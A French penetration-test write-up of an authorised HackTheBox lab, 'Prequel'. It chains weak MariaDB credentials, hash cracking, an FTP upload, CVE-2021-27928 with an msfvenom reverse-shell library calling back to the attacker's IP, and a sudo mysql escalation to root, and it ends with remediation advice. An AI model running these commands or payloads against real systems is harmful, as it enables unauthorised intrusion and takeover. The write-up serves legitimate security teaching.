# Rapport de pentest — HTB « Prequel » (Very Easy)

**Cible :** `10.129.96.9` · **Attaquant (tun0) :** `10.10.14.90`
**Objectif :** compromission complète (user + root)
**Vecteur principal :** réutilisation de credentials + CVE-2021-27928 (MariaDB RCE)
**Résultat :** ✅ compromission totale — user.txt **ET** root.txt obtenus

### Flags

| Flag | Valeur |
|------|--------|
| user.txt | `a0c6fc67cc5d7252a8d3a0f94d8623e2` |
| root.txt | `60bcd89e521e8899e39c19a775cdbf62` |

### Chaîne de compromission (vue d'ensemble)

```
Internet
  │  MariaDB exposé + creds triviaux (root:root)
  ▼
Accès DB (root MySQL) ──► crack hash applicatif ──► developer:treehouse
  │  réutilisation de creds (DB == FTP)
  ▼
Accès FTP (= web root) ──► dépôt d'un .so malveillant
  │  CVE-2021-27928 (wsrep_provider)
  ▼
RCE en tant que `mysql` (compte de service, NON privilégié)
  │  énumération : grep sur /etc ──► mot de passe en clair dans /etc/fstab
  ▼
Accès SSH `lara` ──► user.txt
  │  sudo -l ──► NOPASSWD /usr/bin/mysql ──► GTFOBins
  ▼
root ──► root.txt
```

---

## 1. Reconnaissance

Scan de ports initial (`nmap -sC -sV -p-`) :

| Port | Service | Note |
|------|---------|------|
| 21/tcp | FTP (vsFTPd 3.0.3) | vecteur de dépôt de fichier |
| 22/tcp | SSH | accès potentiel post-creds |
| 80/tcp | HTTP (Apache) | web root accessible → pivot |
| 3306/tcp | MySQL/MariaDB 10.3.27 | **exposé publiquement = anomalie** |

> **Pourquoi c'est intéressant :** un MariaDB exposé sur Internet, c'est déjà une faute de conf.
> S'il accepte en plus des creds faibles, c'est game over.

## 2. Accès initial — base de données

Connexion avec des credentials triviaux (`root:root`), en forçant le downgrade TLS :

```bash
mysql -h 10.129.96.9 -u root -proot --ssl=0
```

Extraction du hash applicatif :

```sql
USE ftpd;
SELECT * FROM users;
-- developer | *5F76CCB4AC484BC82CB4E1A903F10DD76EB4B13E
```

> Le `*` + 40 hex = hash **MySQL native** (`SHA1(SHA1(password))`). John le reconnaît en auto.

Crack :

```bash
john --format=mysql-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# developer : treehouse
```

> **Note d'outillage :** sur Parrot/Kali, `rockyou` est livrée compressée.
> La décompresser une fois : `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`
> (`.gz` → `gunzip`/`gzip -d`, PAS `unzip` qui est réservé aux `.zip`).

## 3. Pivot — réutilisation de credentials

Les creds `developer:treehouse` fonctionnent aussi en **FTP** (classique : un seul mot de passe partout).

```bash
ftp 10.129.96.9   # developer / treehouse
```

Le répertoire FTP correspond au **web root** (`/var/www/html`) → dépôt de fichier arbitraire possible.

## 4. Exploitation — CVE-2021-27928 (MariaDB RCE)

**Version vulnérable :** MariaDB `10.3.27`.
**Principe :** la variable globale `wsrep_provider` (bibliothèque Galera) accepte un chemin
arbitraire. En la pointant vers un `.so` malveillant, le constructeur de la lib s'exécute
**dans le process `mysqld`** → RCE.

> ⚠️ **Correction d'une idée reçue (important) :** RCE ≠ root automatique.
> Le code s'exécute sous l'**UID du process ciblé**, pas sous root par défaut.
> Ici `mysqld` tourne sous le compte de service dédié `mysql` (uid=105) — bonne pratique
> système — donc l'exploit donne un shell **non privilégié**. Le chemin réel est :
> `mysql` → `lara` → `root`.

Génération du payload (⚠️ `LHOST` = IP **de l'attaquant**, `10.10.14.90`, PAS une IP `10.129.x.x`
qui appartient au réseau de la cible) :

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.90 LPORT=4444 \
  -f elf-so -o CVE-2021-27928.so
```

Dépôt via FTP dans le web root (puis `ls` pour **confirmer de ses yeux** que le fichier est bien là) :

```bash
ftp> cd html
ftp> put CVE-2021-27928.so
ftp> ls
```

Listener en écoute :

```bash
nc -lvnp 4444
```

Déclenchement depuis MariaDB :

```sql
SET GLOBAL wsrep_provider='/var/www/html/CVE-2021-27928.so';
```

> **Piège à connaître :** le déclenchement renvoie `ERROR 2013: Lost connection to server during query`.
> **Ce n'est PAS un échec** — c'est le signe du succès : `mysqld` bascule entièrement dans le
> payload et ne peut plus répondre au protocole MySQL, d'où la coupure. Le réflexe à garder :
> une « erreur » qui correspond au comportement attendu de l'exploit ne doit pas faire relancer
> l'attaque en boucle.

→ Shell reçu en tant que `mysql`. Stabilisation :

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# (Ctrl+Z puis `stty raw -echo; fg` côté attaquant pour un TTY complet)
```

Confirmation de l'UID :

```bash
id
# uid=105(mysql) gid=112(mysql) groups=112(mysql)   → compte de service, aucun privilège
```

## 5. Énumération post-exploitation

Comptes à shell réels :

```bash
cat /etc/passwd | grep -vE 'nologin|false'
# root:x:0:0:root:/root:/bin/bash
# lara:x:1000:1000:,,,:/home/lara:/bin/bash
```

> `developer` n'est **pas** un compte système — c'était un identifiant purement applicatif
> (DB + FTP). Seules vraies cibles : `root` et `lara`.

Pistes creusées puis écartées (traçabilité) :

| Piste | Résultat |
|-------|----------|
| `/var/lib/mysql/.mysql_history` | absent |
| `/var/www/html` | uniquement `index.html` — aucun secret |
| Réutilisation `treehouse` sur `lara` | `su lara` → échec |
| Hash `mysql.user` (`root@%`, `vsftpd@localhost`) | **leurres** — comptes techniques, non crackables via rockyou, sans lien avec l'utilisateur système `lara` |

> **Leçon :** avant de cracker un hash, vérifier **à qui** il appartient (colonnes `User`/`Host`).
> Un hash de compte technique MySQL n'est pas le mot de passe d'un utilisateur Linux.

**La fuite décisive** — `grep` sur `/etc` :

```bash
grep -riE "lara|password" /etc 2>/dev/null
```
```
/etc/fstab:#//fileserver01/shared_docs  /mnt/shared_docs  cifs  username=lara,password=l@r4th3b3st,...
```

→ Mot de passe **en clair** dans `/etc/fstab` : **`lara : l@r4th3b3st`**.

> Fuite secondaire relevée au passage (non nécessaire ici) :
> `/etc/pam.d/vsftpd` contient en clair le mot de passe du compte MySQL `vsftpd` (`passwd=kQUfv}I5tRFhT`).

## 6. Accès user — lara

SSH (22) étant ouvert, le mot de passe récupéré donne un shell stable :

```bash
ssh lara@10.129.96.9      # l@r4th3b3st
cat ~/user.txt
# a0c6fc67cc5d7252a8d3a0f94d8623e2
```

## 7. Élévation de privilèges — root

Vérification des droits `sudo` :

```bash
sudo -l
# User lara may run the following commands on prequel:
#     (ALL : ALL) NOPASSWD: /usr/bin/mysql
```

**Analyse :** `lara` peut lancer `/usr/bin/mysql` en tant que n'importe qui (dont root), sans
mot de passe. Le client `mysql` dispose de la commande interne `\!` qui exécute un shell via
`system()`. Lancé sous l'UID root (via `sudo`), ce shell hérite de root. Pattern documenté sur
[GTFOBins → mysql → sudo](https://gtfobins.github.io/gtfobins/mysql/#sudo).

**Adaptation nécessaire :** la commande GTFOBins brute (`sudo mysql -e '\! /bin/sh'`) échoue ici
avec `ERROR 1045: Access denied for user 'root'@'localhost' (using password: NO)`. Le client
tente de se connecter au serveur MariaDB **avant** d'atteindre le prompt `\!`, et le serveur
refuse `root@localhost` sans mot de passe. Solution : fournir des creds MySQL valides (ceux de
l'accès initial, `root:root`) pour que la connexion aboutisse et que `\!` s'exécute.

```bash
sudo mysql -u root -proot -e '\! /bin/sh'
# id → uid=0(root)
cat /root/root.txt
# 60bcd89e521e8899e39c19a775cdbf62
```

> **Leçon :** GTFOBins donne le *pattern*, pas le *contexte*. Un exploit copié-collé qui échoue
> n'est pas forcément faux — lire l'erreur, identifier l'étape qui casse, ajuster.

---

## 8. Synthèse des vulnérabilités

| # | Vulnérabilité | Gravité | Impact |
|---|---------------|---------|--------|
| 1 | MariaDB exposé publiquement (3306) | Élevée | Surface d'attaque critique exposée à Internet |
| 2 | Credentials triviaux `root:root` sur la DB | Critique | Accès administrateur direct à la base |
| 3 | Mot de passe applicatif faible (`treehouse`, dans rockyou) | Élevée | Compromis par simple attaque par dictionnaire |
| 4 | Réutilisation de credentials (DB = FTP) | Élevée | Un seul secret ouvre plusieurs services |
| 5 | FTP pointant sur le web root, écriture autorisée | Élevée | Dépôt de fichier arbitraire → support de l'exploit |
| 6 | MariaDB 10.3.27 non patché (CVE-2021-27928) | Critique | Exécution de code à distance |
| 7 | Mot de passe en clair dans `/etc/fstab` (world-readable) | Critique | Fuite directe du mot de passe de `lara` |
| 8 | Mot de passe en clair dans `/etc/pam.d/vsftpd` | Moyenne | Fuite du secret du compte MySQL `vsftpd` |
| 9 | `sudo NOPASSWD` sur `/usr/bin/mysql` | Critique | Élévation directe vers root (GTFOBins) |

## 9. Remédiation

1. **Ne jamais exposer 3306 à Internet.** Lier MariaDB à `127.0.0.1` (`bind-address = 127.0.0.1`)
   ou filtrer au pare-feu ; n'exposer que les ports strictement nécessaires.
2. **Supprimer les credentials par défaut/triviaux.** Mots de passe forts et uniques pour tous
   les comptes de base de données ; proscrire `root:root`.
3. **Politique de mots de passe robuste.** Longueur/complexité suffisantes pour résister aux
   attaques par dictionnaire (rockyou) ; bannir les mots de passe réutilisés entre services.
4. **Patcher MariaDB.** Mettre à jour vers une version corrigeant CVE-2021-27928, ou restreindre
   les privilèges permettant de modifier `wsrep_provider` (`SUPER`/`SYSTEM_VARIABLES_ADMIN`).
5. **Cloisonner FTP et web root.** Le compte FTP ne doit pas pouvoir écrire dans un répertoire
   servi/exécuté par le serveur web ; retirer le droit d'écriture ou isoler les arborescences.
6. **Jamais de secret en clair dans un fichier de conf.** Pour un montage CIFS, utiliser un
   fichier `credentials` dédié en `chmod 600 root:root` (`credentials=/root/.smbcreds`) plutôt
   que le mot de passe inline dans `/etc/fstab` (lisible par tous). Idem pour `pam_mysql`.
7. **Principe du moindre privilège sur `sudo`.** Ne jamais accorder `sudo` (surtout `NOPASSWD`)
   sur un binaire interactif ou extensible (`mysql`, `vim`, `less`, `find`, `awk`, `python`,
   `tar`…) : tout binaire capable de spawn un shell, lire/écrire des fichiers arbitraires ou
   exécuter du code devient un vecteur d'élévation complet (cf. GTFOBins). Si un besoin
   d'administration MySQL existe pour `lara`, utiliser les privilèges **internes** à MySQL
   (grants ciblés), pas un `sudo` sur le binaire.

---

*Rapport rédigé à des fins pédagogiques dans le cadre d'un lab HackTheBox autorisé.*